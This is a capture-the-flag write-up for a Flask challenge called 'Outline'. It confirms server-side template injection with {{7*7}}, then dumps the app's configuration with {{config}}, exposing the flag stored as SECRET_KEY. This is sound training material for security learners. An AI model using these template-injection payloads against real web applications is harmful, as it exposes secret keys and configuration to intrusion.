# Outline - Task 1

---

## Challenge Description 
Oh look its a vulnerable flask app! There are 2 flags hidden here. Good luck!

Task 1: Retrieve the flag from its configs

`nc c2.lagncrash.com 8002`

---

## Challenge Solution
Firstly, I used the command given to netcat into the server and then accessed the link.
```
[spawner] Spinning up new instance of:
[spawner]     Outline
[spawner]
[spawner] Access your challenge at:
[spawner]     http://c2.lagncrash.com:12768/
[spawner]
[spawner] ------------------------- NOTE --------------------------
[spawner] Hit [Enter] to destroy your challenge instance once done!
```

After accessing the link, I registered for an account and logged in to see this webpage.

![Screenshot 2022-03-27 170954](https://user-images.githubusercontent.com/101789488/160274756-431c5ee3-b326-4da8-b1be-206e6b3a8696.png)

Since the challenge description told us that it was a vulnerable flask app, I did some research and found that the page could possibly be vulnerable to [Server Side Template Injection (SSTI)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). From there, I tried the following payload:
```
{{7*7}}
```
![Screenshot 2022-03-27 180732](https://user-images.githubusercontent.com/101789488/160276571-ab85f3c0-f66e-4a1a-95e7-e6b8175d85eb.png)

The following result proved that the page was vulnerable to SSTI.
```
From: To: Subject: 49
```

Since the challenge description hinted us that we can retrieve the flag from the configs, I did some research and found the following payload:
```
{{config}}
```

Using the payload, I managed to retrieve the flag.
```
From: To: Subject: <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'LNC2022{s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```
![Screenshot 2022-03-27 183104](https://user-images.githubusercontent.com/101789488/160277330-e65993ec-0154-41ee-a3f5-fa66d68dc548.png)

```
LNC2022{s1mpl3_fl4sk_s3rv3r_s1d3_t3mpl4t3_1nj3c10n}
```